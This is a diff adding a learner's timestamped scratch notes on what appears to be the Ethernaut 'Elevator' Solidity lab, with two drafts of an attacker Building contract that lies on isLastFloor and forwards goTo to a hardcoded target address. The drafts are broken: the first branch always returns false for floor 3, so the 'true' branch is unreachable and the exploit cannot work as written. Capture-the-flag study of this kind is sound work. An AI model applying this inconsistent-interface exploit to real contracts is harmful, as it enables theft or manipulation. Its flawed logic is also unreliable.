@@ -6,3 +6,73 @@ This elevator won't let you reach the top of your building. Right?
 Things that might help:
 Sometimes solidity is not good at keeping promises.
 This Elevator expects to be used from a Building.
+
+
+
+KST March 14 12:51 KST
+what kind of code is this? Building instance from msg.sender...??
+
+anyway I can solve this from console, it seems like.
+
+12:55 KST
+ah, so I need to make a contract that corresponds with Building interface.
+
+
+13:04 KST
+Maybe I can make a counter that clicks!?
+e.a.
+uint = 3 in function goTo.
+
+when the function calls ! building.isLastFloor(_floor) in an if condition statement,
+a counter just clicks, and
+next time _floor(lt's just say uint 3) is used in .isLastFloor(), automatically returns true.
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Building {
+  uint256 public counter;
+  function isLastFloor(uint _haha) external returns (bool) {
+      if(_haha == 3) {
+          counter +=1;
+          return false;
+      }
+
+      if(_haha == 3 && counter ==1) {
+          return true;
+      }
+  }
+}
+
+
+I will try this code above. 13:10 KST
+
+a, shit. forgot to pub .call that triggers goTo.
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Building {
+  uint256 public counter;
+  address public target = 0xC40561420EE3774Bd187aFacAC6AaB471917b4c9;
+  function isLastFloor(uint _haha) external returns (bool) {
+      if(_haha == 3) {
+          counter +=1;
+          return false;
+      }
+
+      if(_haha == 3 && counter ==1) {
+          return true;
+      }
+  }
+
+  function goTo(uint _haha) external {
+      (bool success , ) = target.call(abi.encodeWithSignature("goTo(uint256)", _haha));
+      require(success, "haha");
+  }
+}
+
+
+220314 13:14 KST
+okay. try the one above. the moment of truth.
